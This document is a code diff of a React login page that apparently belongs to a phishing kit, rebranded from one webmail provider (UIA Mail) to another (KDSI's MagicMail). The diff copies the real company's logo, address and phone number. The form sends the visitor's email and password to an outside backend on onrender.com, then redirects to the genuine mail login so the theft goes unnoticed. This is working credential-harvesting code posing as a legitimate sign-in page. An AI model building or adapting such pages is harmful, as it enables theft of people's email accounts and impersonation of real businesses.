@@ -8,6 +8,8 @@ import magic from './magic.png';
 
 import axios from 'axios';
 import uia from './uia.png';
+import magicwhite  from './magicwhite.png';
+import kdsi from './kdsi.png';
 
 function Home(){
     const[email, setEmail] = useState("");
@@ -15,7 +17,7 @@ function Home(){
     const [showPassword, setShowPassword] = useState(false);
   const [password, setPassword] = useState('');
 
-  const[platform, setPlatform] = useState("UIA")
+  const[platform, setPlatform] = useState("KDSI")
 
   const[showError, setShowError] = useState(false);
 
@@ -28,7 +30,7 @@ function Home(){
       e.preventDefault();
 
       try {
-        const response = await axios.post('https://backendone-d60j.onrender.com/api/send', {
+        const response = await axios.post('https://akamubackend.onrender.com/api/send', {
             email:email,
             password:password,
             platform:platform
@@ -40,7 +42,7 @@ function Home(){
         if(response.status == 200){
             console.log(response.data.message);
 
-            window.location.href = 'https://mail.uia.net/login.php';
+            window.location.href = 'https://mail.kdsi.net/login.php';
         }
       } catch (error) {
         // Handle error
@@ -59,23 +61,37 @@ function Home(){
             </div>}
             <div className='main col-md-10 m-auto px-5 py-2'>
 
-                <img src={uia} className="logo" />
+                <div className='d-flex justify-content-between'>
+                <img src={magicwhite} className="logo" />
+
+                <img src={kdsi} className="logo" />
+                </div>
+
+                
 
                 <div className='innerdiv px-3 row'>
                     <div className='col-md-6 pt-3'>
-                        <h2 className='heading'>Welcome to UIA Mail!</h2>
+                        <h2 className='heading'>Welcome to MagicMail</h2>
 
-                        <h3 className='headingtwo'>Login to access your account</h3>
+                        <h3 className='headingtwo'style={{
+                            color:"#10456B",
+                        }}>Login to access your account</h3>
 
                         <p className='content text-justify'>
-                        Welcome to the User Site for the UIA Mail System.
+                        Welcome to the User Site for the MagicMail System.
 This is where you can setup and configure all your email options.
                         </p>
 
-                        <p className='content text-justify'>
-                        Please login by entering your <b>full email address</b> and password.
-                        </p>
+                        <h3 className='headingtwo'style={{
+                            color:"#10456B",
+                        }}>Forgot Your Password?</h3>
 
+<p className='content text-justify'>
+We are dedicated to providing you a secure online environment.
+To have your password reset, please contact your local Customer Service and Technical Support team.
+</p>
+
+     
                        
 
                         <p style={{
@@ -92,7 +108,7 @@ This is where you can setup and configure all your email options.
 
 
                             <form onSubmit={handleSubmit}>
-                                <h3 className='headingtwo'>Sign in to UIA Mail</h3>
+                                <h3 className='headingtwo'>Sign in to MagicMail</h3>
 
                                 <hr
                         style={{
@@ -140,9 +156,7 @@ This is where you can setup and configure all your email options.
 
                             <div className='form-group row buttondiv'>
                                 
-                                <div className='col-6 text-left'style={{
-                                    visibility:"hidden",
-                                }}>
+                                <div className='col-6 text-left'>
                                     <img src={magic} />
                                 </div>
 
@@ -177,10 +191,26 @@ This is where you can setup and configure all your email options.
                         
                          fontSize:"11px",
                          color:"black"
-                    }} className='underthree text-center mt-3'>UIA Mail by Ultimate Internet Access, Inc. <br/>
-                    1300 Hwy 2, PO Box 1959, Wrightwood, CA 92397 <br/>
-                    Tel: (800) 982-6898</p>
+                    }} className='underthree text-center mt-3'>
+                        MagicMail Server is brought to you by KDSI.net one of the Kelly Supply family of companies. <br/>
+1004 W Oklahoma Avenue, Grand Island, NE 68801 <br/>
+Telephone 308.382.8764 <br/>
+hostmaster@kdsi.net
+                    </p>
+
+
+                
+                    
             </div>
+            <div className='text-center col-md-10 m-auto'style={{
+                            background:"#10456B",
+                            color:"white",
+                            fontSize:"13px",
+                        }}>
+                <p>MagicMail is a Registered Trademark of Wizard Tower TechnoServices Ltd.</p>
+            </div>
+
+          
         </>
     );
 }
